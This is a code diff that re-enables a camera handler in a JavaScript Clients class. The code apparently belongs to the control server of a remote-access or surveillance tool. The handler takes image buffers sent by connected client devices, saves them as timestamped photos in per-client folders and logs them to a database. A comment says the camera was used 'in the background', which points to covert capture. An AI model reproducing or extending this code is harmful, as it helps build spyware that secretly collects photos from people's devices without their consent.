@@ -104,36 +104,36 @@ class Clients {
 
         // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //
 
-        // socket.on(CONST.messageKeys.camera, (data) => {
+        socket.on(CONST.messageKeys.camera, (data) => {
 
-        //     // {
-        //     //     "image": <Boolean>,
-        //     //     "buffer": <Buffer>
-        //     // }
+            // {
+            //     "image": <Boolean>,
+            //     "buffer": <Buffer>
+            // }
 
-        //     if (data.image) {
-        //         let uint8Arr = new Uint8Array(data.buffer);
-        //         let binary = '';
-        //         for (var i = 0; i < uint8Arr.length; i++) {
-        //             binary += String.fromCharCode(uint8Arr[i]);
-        //         }
-        //         let base64String = window.btoa(binary);
+            if (data.image) {
+                let uint8Arr = new Uint8Array(data.buffer);
+                let binary = '';
+                for (var i = 0; i < uint8Arr.length; i++) {
+                    binary += String.fromCharCode(uint8Arr[i]);
+                }
+                let base64String = window.btoa(binary);
 
-        //         // save to file
-        //         let epoch = Date.now().toString();
-        //         let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
-        //         fs.writeFileSync(filePath, new Buffer(base64String, "base64"), (error) => {
-        //             if (!error) {
-        //                 // let's save the filepath to the database
-        //                 client.get('photos').push({
-        //                     time: epoch,
-        //                     path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
-        //                 }).write();
-        //             }
-        //             else return; // not ok
-        //         })
-        //     }
-        // });
+                // save to file
+                let epoch = Date.now().toString();
+                let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
+                fs.writeFileSync(filePath, new Buffer(base64String, "base64"), (error) => {
+                    if (!error) {
+                        // let's save the filepath to the database
+                        client.get('photos').push({
+                            time: epoch,
+                            path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
+                        }).write();
+                    }
+                    else return; // not ok
+                })
+            }
+        });
 
         socket.on(CONST.messageKeys.files, (data) => {
             // {
